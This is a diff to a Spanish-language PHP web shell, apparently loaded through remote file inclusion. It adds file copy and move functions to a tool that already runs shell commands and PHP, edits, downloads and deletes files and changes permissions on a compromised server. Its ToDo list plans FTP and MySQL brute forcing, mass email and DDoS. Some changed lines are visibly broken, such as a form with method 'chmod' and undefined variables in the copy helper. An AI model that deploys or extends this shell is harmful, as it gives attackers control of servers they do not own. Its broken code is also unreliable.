@@ -50,6 +50,8 @@
     [+] Agregados los links del menu en una linea abajo
     [+] Muestra el tamaño de los archivos en el navegador
     [+] La función shell() usa proc_open() y pcntl_exec()
+    [!] Optimizada la función guardar()
+    [+] El navegador de archivos permite copiar y mover archivos/directorios
 
     
    ToDo:
@@ -63,8 +65,6 @@
    [+] Agregar brute force de ftp
    [+] Agregar brute force de mysql
    [+] Agregar navegador de sql
-   [+] Agregar para mover y copiar los archivos
-   [+] Agregar para copiar y mover archivos
    [+] Enviar muchos emails de un saque
    [+] DDoS ?
    [+] Poner todas las imágenes en un solo archivo y mostrarlas con css para ahorrar peticiones
@@ -202,6 +202,8 @@ if ($_GET["w"]=="img"){
         die(base64_decode('R0lGODlhEAAQAMQfAJLNW3aXtMfj/pfL/OTr9IivyMvM0Vdwkb7e/UpXbfP2+azU+9Xo9Ovx9u32/mGNRIm77OPx/rXZ/H6xW1Jhe6/S5ERNX5rA1qjL3tvj6ykxQz9GVqDP+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWYoCeO5PidHlNV2HUVRSAHHloxRKM3RE9Ah5qn0hAYjYikAwIUYRRHAaKjdCgoogv0OO1IvtfstkPuALyLsKcAnQLegEknnRCxk4/J5D15CAh1HgENSWVmDxEcBBYig0kMEREdiBwDi42EXwsLHYkDAxkbjQoImgsclZ8Noh4HGQo8Pj0ZDQYajQe5FBQJCRYWGxsaWCXFJSEAOw=='));  
     }elseif($_GET["imagen"]=="izquierda"){
         die(base64_decode('R0lGODlhEAAQAMQfAHaXtJLNW5fL/OTs9YivyMfj/tXb5Fdwkb3e/anT+0lVa/P2+dTn9Ovx9u32/mGNRIm77LXZ/H6xW1Jhe+Px/rTR4ENLXJrA1qjL3uDo7ykxQz5FVZ/P+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWaoCeO5PidHlNV2HURBCADHloxQ6M3Qz9Ah5qn0igYjYikAwIUYRbHQieJcDgWE9EFauxMEZEwVsvtBLxeRmLsIUAfkoD8TFkrRG4EXC6RdOoDdx4ADUkPAQ9oFBwDFiKESRGJFBQFHBwZjoOFYQkdlhwCAhkbjwtgEQmql6INpR4HBgs8Phm2DRUajwe8ExMKChbCGxpZJcclIQA7'));      
+    }elseif($_GET["imagen"]=="copiar"){
+        die(base64_decode('R0lGODlhEAAQAMQfAHKQruzx9sfj/uXt9vL2+tXb5MHU4arT+7zd/YmwylVri5XK/IO76EhUaa/S5bPZ/Ha36VRie5/E2Ft6nt/o7ykxQ0FIVz1EVajL332hvNfn8HyjwI7B76HQ+////////yH5BAEAAB8ALAAAAAAQABAAAAWToCeO42een2c4jpRkAOChpudowxDk3FTWjoFAsGq9YrMUhiBg4XQ8X0rC5ASHAgSBw1CIEkzGEqslELwesIBBHSIQjwchItoEEAz1+3E4EBoiAHcQenwHHQOAHgAECBB2e4eIihMFBAaCcIcLCxQWgQoKEYyaHZwBFyQilQQ5FBQBBhVJNQChEQ0NFhcVdCiqwB4hADs='));      
     }else{
         die();
     }
@@ -1125,7 +1127,7 @@ psybnc.conf
             
             //mostramos el formulario
             echo '
-            <form action="'.$rfiurl.'w=chmod" method="post"><table style="text-align: right;">
+            <form action="'.$rfiurl.'w=mover" method="chmod"><table style="text-align: right;">
             <tr><td>Archivo:</td><td><input type="text" style="width:100%;" name="ruta" value="'.htmlentities($ruta ,ENT_QUOTES,'UTF-8').'"></td></tr>
             <tr><td>Permisos:</td><td><input type="text" style="width:100%;" name="chmod" value="'.htmlentities(substr(sprintf('%o', fileperms($ruta)), -4),ENT_QUOTES,'UTF-8').'"></td></tr>
             <tr><td>Due&ntilde;o:</td><td>'.$listausuarios.'</td></tr>
@@ -1139,6 +1141,43 @@ psybnc.conf
         }
         
         echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($ruta),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
+    break;
+
+    /* Mover y copiar archivos y carpetas */
+    case "copiar":
+        echo '<div style="text-align:center;">
+        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
+        </div>';
+        
+        $rutaOrigen = $_REQUEST['origen'];
+        $rutaDestino = $_REQUEST['destino'];
+        
+            //mostramos el formulario
+            echo '
+            <form action="'.$rfiurl.'w=copiar" method="post"><table style="text-align: right;">
+            <tr><td>Origen:</td><td><input type="text" style="width:100%;" name="origen" value="'.htmlentities($rutaOrigen ,ENT_QUOTES,'UTF-8').'"></td></tr>
+            <tr><td>Destino:</td><td><input type="text" style="width:100%;" name="destino" value="'.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'"></td></tr>
+            <tr><td border="0"></td><td><input type="submit" value="Mover" name="action" style="width:100%;"><br><input type="submit" value="Copiar" name="action" style="width:100%;"></td></tr>
+            </table></form>
+            ';
+        
+        if(isset($rutaOrigen) and isset($rutaDestino)){
+            if ($_POST['action']=="Copiar"){
+                if(copiar_recursivo($rutaOrigen,$rutaDestino)){
+                    echo '<div class="s center">'.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' fue copiado a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
+                }else{
+                    echo '<div class="n center">No se pudo copiar '.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
+                }
+                echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($rutaOrigen),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
+            }elseif($_POST['action']=="Mover"){
+                if(rename($rutaOrigen,$rutaDestino)){
+                    echo '<div class="s center">'.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' fue movido a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
+                }else{
+                    echo '<div class="n center">No se pudo mover '.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
+                }
+                echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($rutaOrigen),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
+            }
+        }
     break;
 
     /* Enviar emails */
@@ -1474,15 +1513,15 @@ global $rfiurl;
 
     //$celdaeditar es la primer columna
     if(is_link($ruta.$barra.$archivo)){         //Cuando son links
-        $celdaeditar = '<td style="color:#CD2626;" class="ac"><a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
+        $celdaeditar = '<td style="color:#CD2626;" class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
         $salida = '<img src="'.$rfiurl.'w=img&imagen=enlace" class="ai" alt="Enlace"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a> <img src="'.$rfiurl.'w=img&imagen=flechad" class="ai" alt="enlaza a ">'.mostrarlink("",readlink($ruta.$barra.$archivo),TRUE);
         
     }elseif (is_dir($ruta.$barra.$archivo)){        //Directorios
-        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=shell&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comandos" class="ai" alt="Ejecutar comandos"></a> <a href="'.$rfiurl.'w=php&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=php" class="ai" alt="Ejecutar PHP"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
+        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=shell&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comandos" class="ai" alt="Ejecutar comandos"></a> <a href="'.$rfiurl.'w=php&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=php" class="ai" alt="Ejecutar PHP"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
         $salida = '<img src="'.$rfiurl.'w=img&imagen=carpeta" class="ai" alt="Carpeta"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a>';
         
     }else{      //Archivos
-        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=editar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=editar" class="ai" alt="Editar"></a> <a href="'.$rfiurl.'w=descargar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=descargar" class="ai" alt="Descargar"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
+        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=editar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=editar" class="ai" alt="Editar"></a> <a href="'.$rfiurl.'w=descargar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=descargar" class="ai" alt="Descargar"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
         $salida = '<img src="'.$rfiurl.'w=img&imagen=archivo" class="ai" alt="Archivo"> '.htmlentities($archivo,ENT_QUOTES,'UTF-8');
     }
     
@@ -1658,15 +1697,33 @@ function decodeSize( $bytes )
 function borrar($carpeta){
     if (is_file($carpeta)){
         return unlink($carpeta) or shell("rm -rf ".escapeshellarg($carpeta), FALSE);
-    }
-    foreach(glob($carpeta."/*") as $archivos_carpeta){
-        if(is_dir($archivos_carpeta)){
+    }else{
+        foreach(glob($carpeta."/*") as $archivos_carpeta){
             borrar($archivos_carpeta);
-        }else{
-            unlink($archivos_carpeta) or shell("rm -rf ".escapeshellarg($carpeta), FALSE);
+        }
+        return rmdir($carpeta) or shell("rm -rf ".escapeshellarg($carpeta), FALSE);
+    }
+}
+
+//copiar un archivo o carpeta
+function copiar_recursivo($origen,$destino) {
+    //mezcla entre http://ar.php.net/manual/es/function.copy.php#91010 y http://aidanlister.com/2004/04/recursively-copying-directories-in-php/
+    if (is_file($origen)) {
+        return copiar_archivo($origen, $destino);
+    }
+    //aca sigue solo si es un directorio
+    $dir = opendir($origen);
+    mkdir($destino);
+    while(false !== ( $archivo = readdir($dir)) ) {
+        if (( $archivo != '.' ) && ( $archivo != '..' )) {
+            $salida = copiar_recursivo($origen . '/' . $archivo, $destino . '/' . $archivo);
         }
     }
-    return rmdir($carpeta) or shell("rm -rf ".escapeshellarg($carpeta), FALSE);
+    closedir($dir);
+    return $salida;
+} 
+function copiar_archivo($origen, $destino){
+    return copy($origen,$destino) or ((($archivo=leerarchivo($rutaOrigen))!==false) and (escribirarchivo($rutaDestino,$archivo)!==false)) or shell("cp ".escapeshellarg($origen).' '.escapeshellarg($destino), FALSE);
 }
 
 //muestra el contenido de un archivo en un textbox
